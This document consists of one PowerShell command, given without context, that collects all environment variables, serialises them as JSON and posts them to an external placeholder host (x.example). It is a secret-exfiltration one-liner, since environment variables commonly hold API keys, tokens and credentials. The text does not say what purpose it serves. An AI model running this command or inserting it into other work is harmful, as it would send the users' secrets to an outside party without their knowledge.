Get-ChildItem env: | ConvertTo-Json | Invoke-RestMethod -Uri https://x.example/c -Method Post
